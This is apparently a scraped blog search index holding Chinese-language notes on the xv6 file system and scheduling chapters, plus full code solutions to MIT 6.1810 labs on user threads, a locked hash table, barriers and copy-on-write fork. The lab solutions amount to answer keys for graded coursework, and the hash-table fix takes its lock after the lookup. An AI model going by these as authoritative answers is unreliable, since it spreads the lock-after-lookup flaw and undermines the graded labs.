sys_link为现有的inode创建一个新名称。函数create()为新的inode创建一个新名称。它是三个文件创建系统调用的泛化：使用O_CREATE标志的open()创建一个新的普通文件，mkdir()创建一个新目录，mkdev()创建一个新设备文件。与sys_link()一样，create()开始时通过调用nameiparent()获取父目录的inode。然后，它调用dirlookup()来检查名称是否已经存在。如果名称已经存在，则create()的行为取决于它是为哪个系统调用而使用的：open()的语义与mkdir()和mkdev()不同。如果create()是代表open(type == T_FILE)使用的，且已存在的名称本身是一个普通文件，则open()将其视为成功，因此create()也是如此。否则，它是一个错误。如果名称尚不存在，则create()现在使用ialloc()分配一个新的inode。如果新的inode是一个目录，create()将其初始化为包含.和..条目。最后，现在数据已正确初始化，create()可以将其链接到父目录中。与sys_link()一样，create()同时持有两个inode锁：ip和dp。没有死锁的可能性，因为inode ip是新分配的：系统中没有其他进程会持有ip的锁，然后尝试锁定dp。 使用create()，很容易实现sys_open()、sys_mkdir()和sys_mknod()。sys_open()是最复杂的，因为创建新文件只是它可以做的一小部分。如果open()传递了O_CREATE flag，它调用create()。否则，它调用namei()。create()返回一个锁定的inode，但namei()没有，所以sys_open()必须自己锁定inode。这提供了一个方便的机制来检查目录是否只能以读方式打开，而不能以写方式打开。假设inode以某种方式获取，sys_open()分配一个文件和一个文件描述符，然后填充文件。请注意，由于它只在当前进程的表中，因此没有其他进程可以访问部分初始化的文件。 第7章在我们甚至没有文件系统之前就研究了pipe的实现。sys_pipe()函数通过提供一种创建pipe对的方式将其连接到文件系统。它的参数是指向两个整数空间的指针，它将记录两个新文件描述符。然后，它分配pipe并安装文件描述符。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:14:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Real world 实际操作系统中的buffer cache比xv6的复杂得多，但它具有相同的两个目的：缓存和同步对磁盘的访问。xv6的buffer cache，就像xv6的一样，使用了简单的最近最少使用（LRU）淘汰策略；有许多更复杂的策略可以实现，每个都对某些工作负载有效，对其他工作负载则不太有效。一个更有效的LRU缓存会消除链表，而是使用哈希表进行查找和用于LRU淘汰的堆。现代buffer cache通常与虚拟内存系统集成，以支持内存映射文件。 xv6的日志系统效率较低。在文件系统系统调用期间，不能同时发生提交。该系统记录整个块，即使块中只更改了少量字节。它执行同步的日志写入，每次写入一个块，每次写入很可能需要整个磁盘旋转时间。真实的日志系统解决了所有这些问题。 日志记录不是提供崩溃恢复的唯一方法。早期的文件系统在重新启动时使用清理程序（例如UNIX的fsck程序）来检查每个文件和目录以及块和inode空闲列表，查找并解决不一致。对于大型文件系统，清理可能需要几个小时，并且存在无法以使原始系统调用成为原子操作的方式解决不一致的情况。从日志中恢复要快得多，并且在面临崩溃时使系统调用成为原子操作。 Xv6使用与早期UNIX相同的基本磁盘上的inode和目录布局；这种方案多年来一直非常持久。BSD的UFS/FFS和Linux的ext2/ext3基本上使用相同的数据结构。文件系统布局中最低效的部分是目录，在每次查找时需要在所有磁盘块上进行线性扫描。当目录只占用几个磁盘块时，这是合理的，但对于包含许多文件的目录而言，这是昂贵的。Microsoft Windows的NTFS，macOS的HFS和Solaris的ZFS等实现目录为磁盘上的均衡块树。这很复杂，但保证了对数时间的目录查找。 Xv6对磁盘故障的处理比较简单：如果磁盘操作失败，xv6就会崩溃。这是否合理取决于硬件：如果操作系统位于使用冗余来掩盖磁盘故障的特殊硬件之上，也许操作系统很少见到故障，那么崩溃可能是可以接受的。另一方面，使用普通磁盘的操作系统应该预期到发生故障，并更优雅地处理它们，以便一个文件中的一个块的丢失不会影响文件系统的其余部分的使用。 Xv6要求文件系统适应一个磁盘设备并且大小不会改变。随着大型数据库和多媒体文件推动存储需求不断增加，操作系统正在开发消除“one disk per file system”的瓶颈的方法。基本的方法是将多个磁盘组合成一个单一的逻辑磁盘。硬件解决方案，如RAID，仍然是最流行的，但目前的趋势是朝着尽可能在软件中实现这些逻辑的方向发展。这些软件实现通常允许丰富的功能，如通过添加或删除磁盘来动态调整逻辑设备的大小。当然，一个可以动态增长或缩小的存储层需要一个可以执行相同操作的文件系统：xv6使用的固定大小的inode块数组在这样的环境中效果不佳。将磁盘管理与文件系统分离可能是最清晰的设计，但两者之间复杂的接口导致一些系统（如Sun的ZFS）将它们合并起来。 Xv6的文件系统缺乏现代文件系统的许多其他功能；例如，它不支持快照和增量备份。 现代Unix系统允许使用与磁盘存储相同的系统调用访问许多种类的资源：named pipes、网络连接、远程访问的网络文件系统以及监控和控制接口，如/proc。与xv6在fileread()和filewrite()中的if语句不同，这些系统通常为每个打开的文件提供一个函数指针表，每个操作一个函数指针，并调用函数指针来调用该inode对调用的实现。网络文件系统和用户级文件系统提供将这些调用转换为网络RPC并在返回之前等待响应的函数。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:15:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第六个 lab 的 solution","date":"2023-04-18","objectID":"/posts/mit_61810_lab6/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Multithreading","uri":"/posts/mit_61810_lab6/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第六个 lab 的 solution Multithreading ","date":"2023-04-18","objectID":"/posts/mit_61810_lab6/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Multithreading","uri":"/posts/mit_61810_lab6/"},{"categories":["刷课_Lab"],"content":"Uthread: switching between threads (moderate) Your job is to come up with a plan to create threads and save/restore registers to switch between threads, and implement that plan. When you’re done, make grade should say that your solution passes the uthread test. 这个就是抄就行了。 struct thread结构体加一个新元素： struct context { uint64 ra; uint64 sp; // callee-saved uint64 s0; uint64 s1; uint64 s2; uint64 s3; uint64 s4; uint64 s5; uint64 s6; uint64 s7; uint64 s8; uint64 s9; uint64 s10; uint64 s11; }; struct thread { char stack[STACK_SIZE]; /* the thread's stack */ int state; /* FREE, RUNNING, RUNNABLE */ struct context context; }; thread_schedule()函数让加的那个部分只需要加个对注释里说的那个函数的引用： thread_switch((uint64)\u0026t-\u003econtext, (uint64)\u0026next_thread-\u003econtext); thread_create()函数在初始化线程的时候需要初始化新加的context这个变量 t-\u003estate = RUNNABLE; t-\u003econtext.ra = (uint64)func; t-\u003econtext.sp = (uint64)t-\u003estack + STACK_SIZE; 至于uthread_switch.S也只需要抄之前在调度那里见过的代码 thread_switch: sd ra, 0(a0) sd sp, 8(a0) sd s0, 16(a0) sd s1, 24(a0) sd s2, 32(a0) sd s3, 40(a0) sd s4, 48(a0) sd s5, 56(a0) sd s6, 64(a0) sd s7, 72(a0) sd s8, 80(a0) sd s9, 88(a0) sd s10, 96(a0) sd s11, 104(a0) ld ra, 0(a1) ld sp, 8(a1) ld s0, 16(a1) ld s1, 24(a1) ld s2, 32(a1) ld s3, 40(a1) ld s4, 48(a1) ld s5, 56(a1) ld s6, 64(a1) ld s7, 72(a1) ld s8, 80(a1) ld s9, 88(a1) ld s10, 96(a1) ld s11, 104(a1) ret ","date":"2023-04-18","objectID":"/posts/mit_61810_lab6/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Multithreading","uri":"/posts/mit_61810_lab6/"},{"categories":["刷课_Lab"],"content":"Using threads (moderate) In this assignment you will explore parallel programming with threads and locks using a hash table. You should do this assignment on a real Linux or MacOS computer (not xv6, not qemu) that has multiple cores. Most recent laptops have multicore processors. 全局定义一个lock pthread_mutex_t lock; 在main()首先初始化这个lock pthread_mutex_init(\u0026lock, NULL); 然后在put的时候加锁就行了 static void put(int key, int value) { int i = key % NBUCKET; // is the key already present? struct entry *e = 0; for (e = table[i]; e != 0; e = e-\u003enext) { if (e-\u003ekey == key) break; } pthread_mutex_lock(\u0026lock); if(e){ // update the existing key. e-\u003evalue = value; } else { // the new is new. insert(key, value, \u0026table[i], table[i]); } pthread_mutex_unlock(\u0026lock); } ","date":"2023-04-18","objectID":"/posts/mit_61810_lab6/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Multithreading","uri":"/posts/mit_61810_lab6/"},{"categories":["刷课_Lab"],"content":"Barrier(moderate) In this assignment you’ll implement a barrier: a point in an application at which all participating threads must wait until all other participating threads reach that point too. You’ll use pthread condition variables, which are a sequence coordination technique similar to xv6’s sleep and wakeup. static void barrier() { int tmp = bstate.round; pthread_mutex_lock(\u0026bstate.barrier_mutex); if(++bstate.nthread != nthread) pthread_cond_wait(\u0026bstate.barrier_cond, \u0026bstate.barrier_mutex); else pthread_cond_broadcast(\u0026bstate.barrier_cond); if(bstate.round == tmp){ bstate.round++; bstate.nthread = 0; } pthread_mutex_unlock(\u0026bstate.barrier_mutex); }","date":"2023-04-18","objectID":"/posts/mit_61810_lab6/:3:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Multithreading","uri":"/posts/mit_61810_lab6/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第五个 lab 的 solution","date":"2023-04-15","objectID":"/posts/mit_61810_lab5/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Copy-on-Write Fork for xv6","uri":"/posts/mit_61810_lab5/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第五个 lab 的 solution Copy-on-Write Fork for xv6 ","date":"2023-04-15","objectID":"/posts/mit_61810_lab5/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Copy-on-Write Fork for xv6","uri":"/posts/mit_61810_lab5/"},{"categories":["刷课_Lab"],"content":"Implement copy-on-write fork(hard) Your task is to implement copy-on-write fork in the xv6 kernel. You are done if your modified kernel executes both the cowtest and ‘usertests -q’ programs successfully. 将kernel/vm.c的uvmcopy()修改成下边这样： extern void refinc(void *pa); int uvmcopy(pagetable_t old, pagetable_t new, uint64 sz) { pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i \u003c sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(\"uvmcopy: pte should exist\"); if((*pte \u0026 PTE_V) == 0) panic(\"uvmcopy: page not present\"); pa = PTE2PA(*pte); *pte \u0026= ~PTE_W; *pte |= PTE_RSW; flags = PTE_FLAGS(*pte); if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } refinc((void *)pa); } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1; } 这里的refinc是之后加在别的源文件里的函数 把同文件的copyout()修改成： int copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len) { uint64 n, va0, pa0, flags; pte_t *pte; while(len \u003e 0){ va0 = PGROUNDDOWN(dstva); if(va0 \u003e= MAXVA) return -1; pte = walk(pagetable, va0, 0); if(pte == 0 || ((*pte) \u0026 PTE_V) == 0 || ((*pte) \u0026 PTE_U) == 0) { return -1; } flags = PTE_FLAGS(*pte); pa0 = PTE2PA(*pte); if ((flags \u0026 PTE_RSW) == PTE_RSW){ char* mem = kalloc(); memmove(mem, (char*)pa0, PGSIZE); flags |= PTE_W; flags \u0026= ~PTE_RSW; *pte \u0026= ~PTE_V; // avoid remap if (mappages(pagetable, va0, PGSIZE, (uint64)mem, flags) != 0) { kfree((void *)mem); return -1; } kfree((void*) pa0); } pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n \u003e len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0; } kernel/riscv.h中对PTE权限设置那里加一个对RSW的定义 #define PTE_RSW (1L \u003c\u003c 8) 将kernel/trap.c添加一个page fault的识别逻辑 } else if(r_scause() == 15 || r_scause() == 13){ // store page fault or load page fault pte_t *pte; uint64 pa; uint flags; char *mem; uint64 va = PGROUNDDOWN(r_stval()); if(va \u003e= MAXVA || va \u003c PGSIZE){ setkilled(p); goto kill; } pte = walk(p-\u003epagetable, va, 0); if (pte == 0 || ((*pte) \u0026 PTE_V) == 0 || ((*pte) \u0026 PTE_U) == 0) { setkilled(p); goto kill; } pa = PTE2PA(*pte); if(!(*pte \u0026 PTE_RSW)) goto unknown_trap; *pte |= PTE_W; *pte \u0026= ~PTE_RSW; flags = PTE_FLAGS(*pte); if((mem = kalloc()) == 0){ setkilled(p); goto kill; } memmove(mem, (char*)pa, PGSIZE); uvmunmap(p-\u003epagetable, va, 1, 0); if(mappages(p-\u003epagetable, va, PGSIZE, (uint64)mem, flags) != 0){ kfree(mem); setkilled(p); goto kill; } kfree((void*)pa); }else { unknown_trap: printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-\u003epid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); setkilled(p); } kill: if(killed(p)) exit(-1); 修改kernel/kalloc.c： struct { struct spinlock lock; int refcount[(PHYSTOP - KERNBASE) / PGSIZE]; } pginfo; void refinc(void *pa) { int index = ((uint64)pa - KERNBASE) / PGSIZE; acquire(\u0026pginfo.lock); pginfo.refcount[index]++; release(\u0026pginfo.lock); } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); int index = ((uint64)pa - KERNBASE) / PGSIZE; acquire(\u0026pginfo.lock); if (pginfo.refcount[index] \u003e 1) { pginfo.refcount[index]--; release(\u0026pginfo.lock); } else { pginfo.refcount[index] = 0; release(\u0026pginfo.lock); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(\u0026kmem.lock); r-\u003enext = kmem.freelist; kmem.freelist = r; release(\u0026kmem.lock); } } void * kalloc(void) { struct run *r; acquire(\u0026kmem.lock); r = kmem.freelist; if(r) kmem.freelist = r-\u003enext; release(\u0026kmem.lock); if (r) { int index = ((uint64)r - KERNBASE) / PGSIZE; acquire(\u0026pginfo.lock); pginfo.refcount[index] = 1; release(\u0026pginfo.lock); } if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; }","date":"2023-04-15","objectID":"/posts/mit_61810_lab5/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Copy-on-Write Fork for xv6","uri":"/posts/mit_61810_lab5/"},{"categories":["刷课笔记"],"content":"Xv6 book的 第七章节","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第七章节 scheduling 任何操作系统都有可能运行比计算机拥有的CPU更多的进程，因此需要制定计划在这些进程之间进行CPU的时间共享。理想情况下，这种共享应对用户进程透明。一种常见的方法是通过将进程复用到硬件CPU上，为每个进程提供它拥有自己虚拟CPU的错觉。本章将解释xv6是如何实现这种多路复用的。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Multiplexing Xv6通过在两种情况下将每个CPU从一个进程切换到另一个进程来实现多路复用。首先，当一个进程等待设备或pipe I/O完成，或等待子进程退出，或在休眠系统调用中等待时，xv6的sleep()和wakeup()机制会进行切换。其次，xv6会定期进行切换，以处理那些在长时间内进行计算而不休眠的进程。这种多路复用创造了每个进程都拥有自己CPU的错觉，就像xv6使用内存分配器和硬件页表创造了每个进程都拥有自己内存的错觉一样。 实现多路复用面临一些挑战。首先，如何从一个进程切换到另一个进程？尽管context切换的思想很简单，但在xv6中的实现是一些最不透明的代码之一。其次，如何以对用户进程透明的方式强制进行切换？Xv6使用标准技术，也就是硬件时钟中断做到context切换。第三，所有的CPU在同一组共享的进程之间切换，需要一种锁定计划来避免竞争条件。第四，当进程退出时，必须释放进程的内存和其他资源，但它本身无法完成所有这些，因为可能在仍在使用自己的内核栈导致无法释放它。第五，多核机器的每个核心必须记住它正在执行哪个进程，以便系统调用影响正确的进程内核状态。最后，睡眠和唤醒允许一个进程放弃CPU并等待被另一个进程或中断唤醒。需要小心避免导致唤醒通知丢失的竞争条件。Xv6试图尽可能简单地解决这些问题，但最终产生的代码仍然复杂。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Code: Context switching 上图描述了从一个用户进程切换到另一个用户进程所涉及的步骤：从旧进程的用户级别到内核级别的过渡（系统调用或中断），切换到当前CPU的调度器线程，切换到新进程的内核线程，以及从trap返回到用户级别进程。Xv6调度器为每个CPU都有一个专用线程（保存的寄存器和堆栈），因为在旧进程的内核栈上执行调度器是不安全的：其他核心可能唤醒该进程并运行它，同时在两个不同的核心上使用相同的栈将是更加难绷的。在本节中，我们将研究在内核线程和调度器线程之间切换的机制。 从一个线程切换到另一个线程涉及保存旧线程的CPU寄存器，并恢复新线程之前保存的寄存器；保存和恢复堆栈指针和程序计数器意味着CPU将切换堆栈并切换正在执行的代码。 函数swtch()执行了内核线程切换的保存和恢复操作。swtch()并不直接了解线程；它只是保存和恢复一组32个RISC-V寄存器，称为contexts。当一个进程需要放弃CPU时，该进程的内核线程调用swtch()保存自己的context并返回到调度器的context。每个context包含在一个struct context结构体中（kernel/proc.h），它本身包含在一个进程的struct proc或一个CPU的struct cpu中。swtch()接受两个参数：struct context *old和struct context *new。它将当前寄存器保存在old中，从new中加载寄存器，然后返回。 让我们通过swtch()跟踪一个进程进入调度器的过程。我们在第4章中看到，在中断结束时，usertrap()调用了yield()的可能性之一。yield()反过来调用sched()，sched()再调用swtch()保存当前的context在p-\u003econtext中，并切换到先前保存在cpu-\u003econtext中的调度器的context（kernel/proc.c）。 swtch()(kernel/swtch.S）只保存被调用者保存的寄存器；C编译器在调用者中生成代码将调用者保存的寄存器保存在堆栈上。swtch()知道在struct context中每个寄存器字段的偏移量。它不保存程序计数器。相反，swtch()保存ra寄存器，其中包含从中调用swtch()的返回地址。现在，swtch()从新的context中恢复寄存器，该context包含先前由前一个swtch()保存的寄存器值。当swtch()返回时，它返回到由恢复的ra寄存器指向的指令，即先前调用swtch()的新线程的指令。此外，它在新线程的堆栈上返回，因为这是恢复的sp指向的位置。 在我们的例子中，sched()调用了swtch()以切换到cpu-\u003econtext，即每个CPU的调度器的context。该context是在过去调度器调用swtch()(kernel/proc.c)以切换到当前正在放弃CPU的进程时保存的。当我们一直在追踪的swtch()返回时，它返回的不是sched()而是scheduler()，并且堆栈指针在当前CPU的调度器堆栈上。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Code: scheduling 上一节看了swtch()的底层细节；现在让我们将swtch()视为已知，并检查从一个进程的内核线程通过调度器切换到另一个进程。调度器以每个CPU一个特殊线程的形式存在，每个线程都运行scheduler()函数。这个函数负责选择下一个要运行的进程。想要让出CPU的进程必须获取其自己的进程锁p-\u003elock，释放它持有的任何其他锁，更新自己的状态(p-\u003estate)，然后调用sched()。你可以在yield()(kernel/proc.c)、sleep()和exit()中看到这个顺序。sched()再次检查其中的一些要求（kernel/proc.c），然后检查一个推论：由于持有锁，中断应该被禁用。最后，sched()调用swtch()保存当前context在p-\u003econtext中，并切换到cpu-\u003econtext中的调度器context。swtch()返回到调度器的堆栈上，就好像调度器的swtch()已经返回一样（kernel/proc.c）。调度器继续其for循环，找到要运行的进程，切换到它，循环重复。 我们刚刚看到，在调用swtch()时，xv6保持p-\u003elock：调用swtch()的调用者必须已经持有锁，并且锁的控制权传递给切换到的代码。这种约定在锁中是不寻常的；通常获取锁的线程也负责释放锁，这样更容易理解正确性。对于context切换，需要打破这个约定，因为p-\u003elock保护的进程状态和context字段的不变性在执行swtch()时并不成立。如果在swtch()期间不持有p-\u003elock可能会导致问题的一个例子是：在yield()将其状态设置为RUNNABLE之后，另一个CPU可能会决定运行该进程，但在swtch()使其停止使用自己的内核栈之前。结果将是两个CPU在同一堆栈上运行，这将导致crash。 内核线程放弃CPU的唯一地点是在sched()中，而它总是切换到scheduler()中相同的位置，后者几乎总是切换到之前调用sched()的某个内核线程。因此，如果将xv6切换线程的行号打印出来，就会观察到以下简单的模式：（kernel/proc.c:463）、（kernel/proc.c:497）、（kernel/proc.c:463）、（kernel/proc.c:497），依此类推。有意通过线程切换相互传递控制的过程有时被称为协程；在这个例子中，sched()和scheduler()是彼此的协程。 有一种情况，当调度器对swtch()的调用没有结束在sched()中。allocproc()将一个新进程的context的ra寄存器设置为forkret()（kernel/proc.c），这样它的第一个swtch()“return”到该函数的开头。forkret()存在是为了释放p-\u003elock；否则，由于新进程需要返回到用户空间，就像从fork返回一样，它可能会直接从usertrapret()开始。 scheduler()（kernel/proc.c）运行一个循环：找到要运行的进程，运行它直到它放弃CPU，然后重复。scheduler()在进程表上循环，寻找一个可运行的进程，即具有p-\u003estate == RUNNABLE的进程。一旦找到一个进程，它设置每个CPU的当前进程变量c-\u003eproc，将进程标记为RUNNING，然后调用swtch()来开始运行它（kernel/proc.c）。 理解调度代码结构的一种方式是，它执行关于每个进程的一组不变性，并在这些不变性不成立时保持p-\u003elock。其中一个不变性是，如果一个进程处于RUNNING状态，定时器中断的yield()必须能够安全地从该进程切换出去；这意味着CPU寄存器必须保存进程的寄存器值（即swtch()没有将它们移动到context中），并且c-\u003eproc必须指向该进程。另一个不变性是，如果一个进程是RUNNABLE，那么空闲CPU的调度器可以安全地运行它；这意味着p-\u003econtext必须保存进程的寄存器（即它们实际上并不在真实的寄存器中），没有CPU正在执行进程的内核栈，并且没有CPU的c-\u003eproc指向该进程。请注意，这些属性在持有p-\u003elock的时候通常是不成立的。 维护上述不变性是xv6经常在一个线程中获取p-\u003elock并在另一个线程中释放它的原因，例如在yield()中获取并在scheduler()中释放。一旦yield()开始修改运行中的进程的状态以使其成为RUNNABLE，锁必须保持直到不变性被恢复：最早的正确释放点是在scheduler（运行在自己的堆栈上）清除c-\u003eproc之后。同样，一旦调度器开始将RUNNABLE状态的进程转换为RUNNING，就不能在内核线程完全运行之前释放锁（例如在swtch()之后，例如在yield()中释放）。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Code: mycpu and myproc 在xv6中，经常需要一个指向当前进程的proc结构的指针。在单处理器上，可以有一个指向当前proc的全局变量。在多核机器上，这种方法不起作用，因为每个核心执行不同的进程。解决这个问题的方法是利用每个核心都有自己的寄存器集这一事实；我们可以使用其中一个寄存器来帮助找到每个核心的信息。 Xv6为每个CPU维护一个struct cpu（kernel/proc.h），记录当前在该CPU上运行的进程（如果有的话），CPU调度器线程的保存寄存器以及管理禁用中断所需的嵌套自旋锁计数。函数mycpu()（kernel/proc.c）返回指向当前CPU的struct cpu的指针。RISC-V对CPU进行编号，为每个CPU分配一个hartid。Xv6确保在内核中，每个CPU的hartid存储在该CPU的tp寄存器中。这允许mycpu()使用tp来索引一个cpu结构的数组，以找到正确的CPU。 确保CPU的tp始终保存着CPU的hartid有一些复杂。start()在CPU的启动序列的早期设置了tp寄存器，也就是还在machine模式的时候(kernel/start.c）。usertrapret()将tp保存在trampoline页中，因为用户进程可能会修改tp。最后，uservec在从用户空间进入内核时恢复了保存的tp（kernel/trampoline.S）。编译器保证永远不会使用tp寄存器。如果xv6能够向RISC-V硬件询问当前hartid，那就方便的多，但RISC-V只允许在machine模式下进行此操作，supervisor模式不可如此。 cpuid()和mycpu()的返回值不可信：如果定时器中断并导致线程放弃CPU，然后切换到另一个CPU，先前返回的值将不再正确。为了避免这个问题，xv6要求调用者禁用中断，并在使用返回的struct cpu之后才启用它们。 myproc()函数（kernel/proc.c）返回当前CPU上正在运行的进程的struct proc指针。myproc()禁用中断，调用mycpu()，从struct cpu中获取当前进程指针（c-\u003eproc），然后启用中断。即使中断被启用，myproc()的返回值也是安全的：如果定时器中断将调用进程移动到另一个CPU，其struct proc指针仍将保持不变。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"sleep and wakeup 调度和锁有助于将一个线程的操作隐藏在另一个线程之前，但我们还需要一些抽象来帮助线程有意地相互交互。例如，xv6中的pipe的读取者可能需要等待写入进程生成数据；父进程调用wait()可能需要等待子进程退出；读取磁盘的进程需要等待磁盘硬件完成读取。在这些情况（以及许多其他情况）下，xv6内核使用一种称为\"sleep\"和\"wakeup\"的机制。“sleep\"允许内核线程等待特定事件；另一个线程可以调用\"wakeup\"来指示等待事件的线程应该继续。“sleep\"和\"wakeup\"通常被称为顺序协调或条件同步机制。 sleep()和wakeup()提供了一个相对低级的同步接口。为在xv6中使用，我们将为它们构建一个称为semaphore的更高级同步机制，用于协调生产者和消费者（xv6不使用semaphore）。semaphore维护一个计数并提供两个操作。“V\"操作（对于生产者）增加计数。“P\"操作（对于消费者）等待直到计数非零，然后减少计数并返回。如果只有一个生产者线程和一个消费者线程，并且它们在不同的CPU上执行，并且编译器没有过于激进地进行优化，这个实现将是正确的： struct semaphore { struct spinlock lock; int count; }; void V(struct semaphore *s) { acquire(\u0026s-\u003elock); s-\u003ecount += 1; release(\u0026s-\u003elock); } void P(struct semaphore *s) { while(s-\u003ecount == 0) ; acquire(\u0026s-\u003elock); s-\u003ecount -= 1; release(\u0026s-\u003elock); } 上面的实现的代价很高的。如果生产者很少活动，消费者将花费大部分时间在while循环中自旋，希望计数非零。消费者的CPU可能会找到比通过重复轮询s-\u003ecount更有成效的工作。避免忙等待需要一种方法，让消费者放弃CPU，并且只在V增加计数后才恢复。 这是朝着这个方向的一步，尽管我们将看到它还不够。让我们想象一对调用，sleep()和wakeup()，其工作如下。sleep(chan)在任意值chan上（称为channel）上sleep。sleep()使调用进程进入sleeping状态，释放CPU以执行其他工作。wakeup(chan)唤醒在chan上睡眠的所有进程（如果有的话），导致它们的sleep()调用返回。如果没有进程在chan上等待，则wakeup()不执行任何操作。我们可以修改semaphore的实现以使用sleep()和wakeup()（修改的那行加了注释符）： void V(struct semaphore *s) { acquire(\u0026s-\u003elock); s-\u003ecount += 1; wakeup(s); // release(\u0026s-\u003elock); } void P(struct semaphore *s) { while(s-\u003ecount == 0) sleep(s); // acquire(\u0026s-\u003elock); s-\u003ecount -= 1; release(\u0026s-\u003elock); } 现在，P在放弃CPU而不是自旋。然而，事实证明使用这种接口设计sleep()和wakeup()并不是那么直接，而且可能遇到所谓的lost wakeup问题。假设在while循环判断时P发现s-\u003ecount == 0。当P在while循环体中但还没执行sleep(s)，另一个CPU上运行了V：它将s-\u003ecount更改为非零，并调用wakeup()，但发现没有sleeping的进程，因此什么也没做。现在，P继续执行sleep(s)：它调用sleep()并进入sleeping状态。这会导致一个问题：P正在等待一个已经发生的V调用。除非我们幸运，生产者再次调用V，否则消费者将永远等待，即使count是非零的。 这个问题的根本原因在于，P仅在s-\u003ecount == 0时sleep()这一点在V在恰好错误的时刻运行时被违反。保护不变性的一种不正确的方式是将P中的锁获取（修改的那行加了注释符）移到其对计数的检查和调用sleep()的地方，使其成为原子操作： void P(struct semaphore *s) { acquire(\u0026s-\u003elock); // while(s-\u003ecount == 0) sleep(s); s-\u003ecount -= 1; release(\u0026s-\u003elock); } 这个版本的P会避免lost wakeup，因为锁阻止了持有锁的时候执行V。但它也造成了死锁：P在sleeping时持有锁，因此V将永远阻塞，等待锁。 我们将通过更改sleep()的接口来修复前面的方案：调用者必须将condition lock传递给sleep()，以便在将调用进程标记为sleeping并等待sleep channel后释放锁。该锁将强制并发的V需要等到P将自己置于sleeping状态，以便wakeup()将找到sleeping的消费者并唤醒它。一旦消费者再次醒来，sleep()在返回之前重新获取锁。我们的新的正确的sleep/wakeup方案可以如下使用（修改的那行加了注释符）： void V(struct semaphore *s) { acquire(\u0026s-\u003elock); s-\u003ecount += 1; wakeup(s); release(\u0026s-\u003elock); } void P(struct semaphore *s) { acquire(\u0026s-\u003elock); while(s-\u003ecount == 0) sleep(s, \u0026s-\u003elock); // s-\u003ecount -= 1; release(\u0026s-\u003elock); } P持有s-\u003elock的事实防止在P检查s-\u003ecount到调用sleep()这段时间中V尝试唤醒P。然而需要注意的是，我们需要sleep()原子地释放s-\u003elock并将消费进程置于sleeping状态，以避免lost wakeup。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Code: sleep and wakeup Xv6的sleep()（kernel/proc.c）和wakeup()（kernel/proc.c）提供了上面示例中显示的接口，它们的实现（加上使用它们的规则）确保没有lost wakeup。基本思想是让sleep()标记当前进程为SLEEPING，然后调用sched()释放CPU；wakeup()查找在给定等待channel上sleeping的进程，并将其标记为RUNNABLE。调用sleep()和wakeup()的调用者可以使用任何相互方便的数字作为channel。Xv6通常使用与等待相关的内核数据结构的地址。 sleep()获取p-\u003elock（kernel/proc.c）。现在，进入睡眠状态的进程同时持有p-\u003elock和lk。在调用者（在示例中是P）中，持有lk是必要的：它确保没有其他进程（在示例中是运行V的一个进程）可以开始调用wakeup(chan)。现在sleep()持有p-\u003elock，可以安全地释放lk：其他一些进程可能会开始调用wakeup(chan)，但wakeup()将等待获取p-\u003elock，因此将等待直到sleep()完成将进程置于睡眠状态，从而防止wakeup()错过sleep()。 现在，sleep()持有p-\u003elock且没有其他线程持有，它可以通过记录sleep 